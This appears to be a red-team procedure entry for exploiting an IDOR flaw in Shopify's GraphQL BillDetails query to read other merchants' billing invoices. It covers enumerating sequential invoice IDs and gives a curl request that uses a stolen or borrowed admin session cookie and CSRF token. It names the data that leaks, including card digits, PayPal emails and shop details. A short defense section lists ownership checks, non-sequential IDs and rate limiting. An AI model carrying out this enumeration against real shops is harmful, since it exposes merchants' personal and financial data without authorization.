---
tags:
  - idor
  - graphql
  - shopify
  - pii-leak
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/shopify-graphql-billdetails-query]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[Account Discovery]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 3202c466-9c09-458f-b22a-e7094afbbe3f
created_at: '2025-12-14T17:26:00.239Z'
updated_at: '2025-12-14T17:26:00.239Z'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
  - '[[Account Discovery]]'
---
# Query-Arbitrary-Billing-Invoice-Details-via-GraphQL

## Summary

This procedure exploits an IDOR vulnerability in Shopify's GraphQL BillDetails query to retrieve unauthorized billing invoice details from other merchants, leaking sensitive information such as shop domains, payment methods (e.g., credit card last digits, PayPal emails), invoice timelines, and charge categories.

## Description

In Shopify's Admin API, the BillDetails GraphQL query fetches node details for a BillingInvoice ID without validating ownership against the authenticated user's shop. IDs are global and use predictable numerical sequences (gid://shopify/BillingInvoice/[id]), allowing enumeration. An authenticated session as any merchant or staff enables access to potentially all shops' data, leading to PII exposure including emails, addresses (via PDF in follow-up), and financial details. This is useful in red teaming e-commerce platforms to assess access control flaws.

## Requirements

1. Valid Shopify admin authentication (session cookie and CSRF token)
2. Target shop domain (e.g., yourshop.myshopify.com)
3. Arbitrary invoice ID (enumerate via sequential guessing starting from low numbers)
4. HTTP client supporting JSON payloads and cookies (e.g., curl or Burp Suite)

## Defense

Defensive measures and detection strategies:

- Implement server-side ownership checks on all object references in GraphQL resolvers (e.g., verify invoice.shopId matches session.shopId)
- Use non-predictable, UUID-based IDs instead of sequential numerics
- Rate-limit GraphQL queries on billing endpoints and log anomalous ID access patterns
- Monitor for cross-shop data access via audit logs in GraphQL execution

## Objectives

1. Leak unauthorized billing invoice details including PII and financial data
2. Enumerate and map other merchants' shop structures and payment methods
3. Validate IDOR for further exploitation like PDF downloads

## Instructions

### Step 1: Prepare Authentication

**Context**: Obtain session details from a logged-in Shopify admin session to ensure requests are authenticated.

Inspect browser network tab during admin access to extract Cookie and X-Csrf-Token headers.

### Step 2: Enumerate Invoice ID

**Context**: Guess or brute-force numerical IDs since they are incremental and predictable.

Start with low IDs (e.g., 1) and increment until valid responses are found.

### Step 3: Execute GraphQL Query

**Context**: Send the BillDetails query to fetch details for the arbitrary ID, revealing leaked data if IDOR is present.

**Command** ([[commands/shopify-graphql-billdetails-query]]):
```bash
curl -X POST "https://admin.shopify.com/api/shopify/[shop]/graph?operation=BillDetails&type=query" \
  -H "Content-Type: application/json" \
  -H "Cookie: [your_session_cookie]" \
  -H "X-Csrf-Token: [your_csrf_token]" \
  -d '{"operationName":"BillDetails","variables":{"id":"gid://shopify/BillingInvoice/12345","hasBillingSubscriptionsPermission":false},"query":"[full query as in command template]"}'
```

> This command sends a POST request with the GraphQL payload. Expected output is a JSON object with node.BillingInvoice fields populated with data from another shop if successful, including mismatched shop details.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Steal Web Session Cookie]]
- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-graphql-billdetails-query]]

## Tools Used


## Tags

- idor
- graphql
- shopify
- pii-leak
